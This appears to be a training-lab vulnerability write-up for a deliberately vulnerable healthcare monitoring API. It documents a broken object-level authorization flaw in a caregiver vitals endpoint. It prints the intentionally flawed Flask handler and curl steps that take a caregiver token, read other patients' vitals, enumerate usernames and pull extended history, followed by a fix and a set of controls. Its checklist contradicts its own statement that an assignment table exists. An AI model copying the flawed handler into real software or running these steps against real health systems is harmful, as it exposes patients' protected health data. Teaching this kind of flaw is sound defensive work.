---
id: API-01
title: "Broken Object Level Authorization (BOLA) via Cross-User Vitals Access"
category: API
status: COMPLETADA
severity: High
owasp: "API1:2023 — Broken Object Level Authorization"
cwe: "CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-863"
source_docs:
  - "CareOtter_Test_Suite.md §API-01"
  - "CareOtter_API.md Vulnerability Surface"
affected_components:
  - "cloud_api/careotter/api_server/app.py"
  - "cloud_api/careotter/api_server/services/database_service.py"
verified_date: "2026-05-18"
---
****
# API-01 — Broken Object Level Authorization (BOLA) via Cross-User Vitals Access

> **Status:** ✅ DONE  
> **Source docs:** `CareOtter_Test_Suite.md` §API-01, `CareOtter_API.md` Vulnerability Surface  
> **OWASP:** API1:2023 — Broken Object Level Authorization  
> **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-863  
> **Severity:** High

---

## Why It Matters

**Broken Object Level Authorization (BOLA)** occurs when an API endpoint accepts a user-supplied identifier (object ID, username, UUID) to access a resource, but fails to verify that the authenticated user is actually authorized to access that specific resource.

CareOtter introduces a `caregiver` role — a secondary user with no associated device — and exposes an endpoint (`/api/caregiver/patient/<username>/vitals`) intended to let caregivers monitor their assigned patients. However, the implementation performs **zero ownership validation**: it never checks whether the requested `<username>` belongs to the authenticated caregiver, or even whether the caller has the `caregiver` role at all.

This means any authenticated user (including another patient, or the caregiver themselves) can substitute `<username>` with any existing patient account — such as `patient` — and retrieve that user's complete vitals history, clinical alerts, and device MAC address. In a real healthcare SaaS, this equates to one patient's family member (or an attacker who phishes a caregiver account) gaining unauthorized access to the cardiac telemetry of every other patient in the system.

The impact is severe because cardiac telemetry is considered **Protected Health Information (PHI)** under HIPAA and equivalent regulations. Unauthorized access violates patient privacy, enables stalking or discrimination, and destroys trust in the remote-monitoring platform.

---

## Root Cause

### 1. Missing object-ownership check in the endpoint

The vulnerable endpoint in `app.py` looks up the requested patient by username and immediately returns their data without any authorization gate:

```python
@app.route('/api/caregiver/patient/<username>/vitals', methods=['GET'])
@token_required
def caregiver_patient_vitals(username):
    hours = request.args.get('hours', 24, type=int)
    limit = request.args.get('limit', 1000, type=int)

    device = db.get_device_by_patient(username)
    if not device:
        return jsonify({'error': f'No device found for patient "{username}"'}), 404

    readings = db.get_vitals_history(hours=hours, limit=limit,
                                     device_mac=device.get('mac'))
    alerts = db.get_alerts_history(hours=hours, limit=limit,
                                   device_mac=device.get('mac'))

    return jsonify({
        'patient_username': username,
        'device':           device,
        'hours':            hours,
        'readings_count':   len(readings),
        'readings':         readings,
        'alerts_count':     len(alerts),
        'alerts':           alerts
    }), 200
```

**MISSING:**
- No verification that the authenticated JWT belongs to a user with `role == 'caregiver'`
- No verification that the requested `username` is assigned to the authenticated caregiver
- No deny-by-default fallback — any valid JWT passes through

### 2. Caregiver↔patient assignment table exists but is not enforced

The database schema now includes a `caregiver_assignments` table that links caregivers to their assigned patients, and the caregiver dashboard populates its patient dropdown from this table (`GET /api/caregiver/patients`). However, the BOLA endpoint (`/api/caregiver/patient/<username>/vitals`) **does not query this table**. The frontend appears secure (caregivers only see assigned patients in the UI), but the backend remains vulnerable to direct API manipulation. This creates a pedagogically useful discrepancy: the UI is "secure by design," while the API is "vulnerable by implementation."

### 3. Authentication-only decorator

Like the BFLA vulnerability (API-06), this endpoint uses `@token_required`, which only validates the JWT signature and expiration. It does not extract or inspect the `role` claim, nor does it extract the authenticated username for an ownership check against `caregiver_assignments`.

---

## Affected Endpoint

| Method | Endpoint | Intended Function | Actual Behavior |
|--------|----------|-------------------|-----------------|
| `GET` | `/api/caregiver/patient/<username>/vitals` | Caregiver views their assigned patient's vitals | **BOLA** — Any authenticated user can substitute `<username>` with any patient and retrieve their full vitals, alerts, and device MAC |

### Query Parameters

| Param | Default | Description |
|-------|---------|-------------|
| `hours` | `24` | Lookback window for vitals and alerts |
| `limit` | `1000` | Max rows to return |

---

## Steps to Reproduce

**Precondition:** The system must be initialized (users exist). If the database is empty, run. If Cloud API configuration is set as VULNERABLE=1, this function will be executed by default.

```bash
curl http://localhost:5002/initialize_iot
```

You may also want to register  'care_john' user as a caregiver for user 'john_doe'. Initiate with 'johnny123' password and register 'care_john'.
![[care_john_registered.png]]
### Step 1 — Obtain a valid caregiver JWT

![[care_john_jwt.png]]

```bash
JWT_CAREGIVER=$(curl -s -X POST http://localhost:5002/api/auth/login/caregiver \
  -H "Content-Type: application/json" \
  -d '{"username":"care_john","password":"Caregiver2026!"}' \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "$JWT_CAREGIVER"
```

### Step 2 — Inspect the token payload to confirm `role: caregiver`

```bash
echo -n "$JWT_CAREGIVER" | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool
```

Expected output:
```json
{
  "username": "care_john",
  "role": "caregiver",
  "exp": 1750000000,
  "iat": 1749996400
}
```

### Step 3 — Access another patient's vitals with the caregiver token

Intercept your patient data reading requets.
![[intercept_caregiver_read.png]]

API endpoint for reading patient data requires JWT token used in the "Authorization: Bearer" Header.
![[missing_token_caregiver_read.png]]

![[caregiver_reads_other_pacient_data.png]]

**3A. Read the `patient` user's vitals and device info:**

```bash
curl -s -H "Authorization: Bearer $JWT_CAREGIVER" \
  http://localhost:5002/api/caregiver/patient/patient/vitals \
  | python3 -m json.tool
```

**3B. Read the `admin` user's vitals (if admin has a device):**

```bash
curl -s -H "Authorization: Bearer $JWT_CAREGIVER" \
  http://localhost:5002/api/caregiver/patient/admin/vitals \
  | python3 -m json.tool
```

**3C. Enumerate arbitrary usernames to find valid patients:**

```bash
for u in patient admin alice bob; do
  status=$(curl -s -o /dev/null -w "%{http_code}" \
    -H "Authorization: Bearer $JWT_CAREGIVER" \
    "http://localhost:5002/api/caregiver/patient/${u}/vitals")
  echo "${u}: HTTP ${status}"
done
```

**3D. Exfiltrate extended history (up to 1000 readings):**

```bash
curl -s -H "Authorization: Bearer $JWT_CAREGIVER" \
  "http://localhost:5002/api/caregiver/patient/patient/vitals?hours=168&limit=1000" \
  | python3 -c "import sys,json; d=json.load(sys.stdin); print(f'Readings: {d[\"readings_count\"]}, Alerts: {d[\"alerts_count\"]}, MAC: {d[\"device\"][\"mac\"]}')"
```

---

## Expected Result

All requests above return `200 OK` instead of `403 Forbidden`. The caregiver token is accepted because `@token_required` validates the JWT signature and expiration but **never evaluates whether the caller is authorized to access the requested patient's data**.

Specifically:
- `/api/caregiver/patient/patient/vitals` returns the full `device` object (including MAC address and `patient_username`)
- `readings` contains every `vitals_readings` row for that device (BPM, SpO₂, raw IR/red values, timestamps)
- `alerts` contains every clinical alert (bpm_low, bpm_high, spo2_low) with severity and threshold values
- No rate limiting or audit logging prevents automated enumeration of all patients

---

## How It Should Be

The endpoint must enforce **both** role validation and object-level ownership before returning data.

### Minimal fix

```python
from functools import wraps
from flask import request, jsonify

def caregiver_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        payload = _decode_and_validate()
        if not payload or payload.get('role') != 'caregiver':
            return jsonify({'error': 'Caregiver access required', 'code': 'FORBIDDEN'}), 403
        return f(*args, **kwargs)
    return decorated

# Hypothetical assignment table check
def _is_assigned(caregiver_username, patient_username):
    # In a real system: SELECT 1 FROM caregiver_assignments ...
    return db.check_caregiver_assignment(caregiver_username, patient_username)

@app.route('/api/caregiver/patient/<username>/vitals', methods=['GET'])
@caregiver_required
def caregiver_patient_vitals_fixed(username):
    payload = _decode_and_validate()
    caregiver = payload.get('sub') or payload.get('username')
    if not _is_assigned(caregiver, username):
        return jsonify({'error': 'Patient not assigned to you'}), 403
    # ... remainder of handler
```

### Architectural improvements

1. **Assignment check**: Query `caregiver_assignments` in the endpoint to verify `caregiver_username → patient_username` before returning data.
2. **Deny-by-default**: Return `403` if the assignment check fails.
3. **Scope the query**: Even if the caregiver is assigned, restrict the query to the assigned patient's device only — do not accept arbitrary `device_mac` parameters that could bypass the username check.
4. **Audit logging**: Log every cross-patient access with `caregiver`, `target_patient`, `endpoint`, and `source_ip`.

> **Note for lab operators:** The `caregiver_assignments` table is already present in the schema and populated via `POST /api/patient/caregivers`. The BOLA endpoint intentionally bypasses it to preserve the vulnerability for training purposes.

---

## Controls to Implement

| Layer | Measure | Objective |
|-------|---------|-----------|
| Authorization | Role-enforcing decorator (`@caregiver_required`) on the endpoint | Prevent non-caregivers from invoking the caregiver endpoint |
| Authorization | Object-ownership check against `caregiver_assignments` table | Prevent caregivers from accessing patients they are not assigned to |
| Authorization | Deny-by-default — return `403` if assignment is missing | Fail closed rather than fail open |
| Audit | Log every cross-patient access with caregiver, target, and IP | Enable forensic tracing of unauthorized access attempts |
| Testing | Automated BOLA test suite — caregiver JWT against arbitrary usernames | Detect regressions where ownership checks are removed |

---

## Verification Checklist

- [ ] Caregiver JWT successfully authenticates at `/api/auth/login`
- [ ] Caregiver JWT payload contains `"role": "caregiver"`
- [ ] `GET /api/caregiver/patient/patient/vitals` with caregiver JWT returns `200 OK` and exposes vitals, alerts, and device MAC
- [ ] `GET /api/caregiver/patient/admin/vitals` with caregiver JWT returns `200 OK` (not `403`) if admin has a device
- [ ] `GET /api/caregiver/patient/nonexistent/vitals` returns `404` (not `403`)
- [ ] No assignment table exists in the database schema (confirming the missing authorization layer)
- [ ] Web UI patient routes with caregiver cookie redirect appropriately (confirms UI layer has role separation)

---

## References

- `CareOtter_Test_Suite.md` §API-01
- `CareOtter_API.md` Vulnerability Surface
- `cloud_api/careotter/api_server/app.py` (`caregiver_patient_vitals`)
- `cloud_api/careotter/api_server/services/database_service.py`
